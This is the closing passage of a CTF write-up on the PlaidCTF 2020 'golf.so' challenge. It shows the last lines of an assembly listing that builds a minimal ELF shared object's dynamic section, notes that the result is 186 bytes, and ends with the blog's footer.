+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>dq</span>  <span style=color:#ae81ff>0x5</span>, <span style=color:#66d9ef>stage1</span>
+</span></span><span style=display:flex><span>  dt_symtab:
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>dq</span>  <span style=color:#ae81ff>0x6</span>, <span style=color:#66d9ef>stage1</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>dynsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>dynamic</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>progsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>$$</span>
+</span></span></code></pre></div><p>This produces a binary of 186 bytes.</p><p><img src=https://raw.githubusercontent.com/starfleetcadet75/writeups/master/2020-PlaidCTF/golf.so/flags.png alt=flags></p></div><footer class=post-footer><div class=post-footer-data><div class=tags><div class=tag><a href=/tags/programming>#programming</a></div></div><div class=post-footer-meta>Permalink: <a href=https://starfleetcadet75.github.io/posts/plaid-2020-golf-so/>/posts/plaid-2020-golf-so/</a> | Date: 2020-04-20</div><hr><div class=categories>Published in:<div class=category><a href=/categories/writeups>writeups</a></div></div><div class=series></div></div></footer></article><footer><div class=social-links-footer><a href=mailto:starfleetcadet75@gmail.com><div class=social-link>Email</div></a><a href=https://github.com/starfleetcadet75 target=_blank><div class=social-link>GitHub</div></a><a href=https://gitlab.com/starfleetcadet75 target=_blank><div class=social-link>GitLab</div></a><div class=social-link><a href=https://starfleetcadet75.github.io/index.xml target=_blank>RSS</a></div></div><div class=copyright></div><div class=poweredby>Powered by <a href=https://gohugo.io/>Hugo</a>.</div></footer></div></body></html>
